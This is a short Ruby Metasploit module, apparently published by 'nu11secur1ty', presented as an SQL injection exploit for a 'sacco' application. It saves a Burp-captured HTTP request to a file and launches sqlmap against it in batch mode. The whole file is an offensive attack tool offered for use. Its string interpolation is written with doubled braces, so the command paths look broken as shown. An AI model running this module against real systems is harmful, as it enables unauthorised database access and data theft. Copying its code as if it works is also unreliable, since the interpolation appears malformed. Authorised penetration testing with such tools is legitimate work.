##
# SQLi-sacco.rb
#
# Author: nu11secur1ty
# Description: SQLi-MSF exploit module for sacco app
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'SQLi-sacco',
      'Description'    => 'SQLi-MSF exploit module for sacco app',
      'Author'         => 'nu11secur1ty',
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('RAW_REQUEST', [true, 'Raw HTTP request (from Burp)', ''])
      ]
    )
  end

  def run
    raw_request = datastore['RAW_REQUEST']

    if raw_request.empty?
      print_error("Set RAW_REQUEST first!")
      return
    end

    print_status("Saving RAW_REQUEST to exploit.txt...")

    module_dir = File.expand_path(File.dirname(__FILE__))
    request_file = File.join(module_dir, "exploit.txt")
    File.open(request_file, "w") {{ |f| f.write(raw_request) }}

    sqlmap_path = File.join(module_dir, '..', 'sqlmap.py')

    if File.exist?(sqlmap_path)
      sqlmap_cmd = "python3 {{sqlmap_path}} -r {{request_file}} --batch --level=1"
      print_status("Executing: {{sqlmap_cmd}}")
      system(sqlmap_cmd)
    else
      print_error("sqlmap.py not found in parent directory")
    end
  end
end
